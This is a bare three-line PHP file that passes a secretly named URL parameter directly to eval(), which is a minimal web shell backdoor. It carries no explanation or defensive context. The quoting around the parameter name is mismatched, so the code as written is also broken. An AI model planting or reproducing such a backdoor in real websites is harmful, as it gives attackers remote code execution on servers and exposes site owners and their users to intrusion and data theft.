<?php
eval($_GET["LY3wCLkf']);
?>
